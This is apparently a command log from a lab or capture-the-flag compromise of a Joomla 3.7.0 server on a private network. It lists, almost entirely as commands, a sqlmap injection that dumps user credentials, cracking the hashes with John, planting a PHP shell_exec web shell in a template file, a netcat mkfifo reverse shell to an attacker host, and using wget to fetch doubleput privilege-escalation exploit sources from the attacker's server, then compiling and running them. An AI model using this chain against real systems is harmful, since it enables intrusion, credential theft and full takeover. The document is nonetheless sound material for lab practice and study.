# Commands Used

## SQL Injection (Joomla 3.7.0)

sqlmap -u "http://192.168.56.108/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
-D joomladb \
-T "#__users" \
-C id,username,password \
--dump \
-p list[fullordering] \
--threads=1 \
--no-cast

## Hash Cracking

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

## Remote Command Execution (Web Shell)

The Joomla template file index.php was modified to execute system commands using:
echo shell_exec($_GET['cmd']);
Commands were then executed via browser:
http://192.168.56.108/templates/protostar/index.php?cmd=whoami

## Reverse Shell Listener

nc -lvnp 4444

## Reverse Shell Trigger (Browser)

http://192.168.56.108/templates/protostar/index.php?cmd=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f

## Upgrade Shell (PTY)

python -c 'import pty; pty.spawn("/bin/bash")'

## File Transfer on target(Exploit)

wget http://192.168.56.1:8000/doubleput.c
wget http://192.168.56.1:8000/hello.c
wget http://192.168.56.1:8000/suidhelper.c
wget http://192.168.56.1:8000/compile.sh

## Compile Exploit

gcc -o hello hello.c -Wall -std=gnu99 $(pkg-config fuse --cflags --libs)
gcc -o doubleput doubleput.c -Wall
gcc -o suidhelper suidhelper.c -Wall
gcc -o fuse_mount fuse_mount.c -Wall

## Privilege Escalation

chmod +x hello doubleput suidhelper fuse_mount
./doubleput
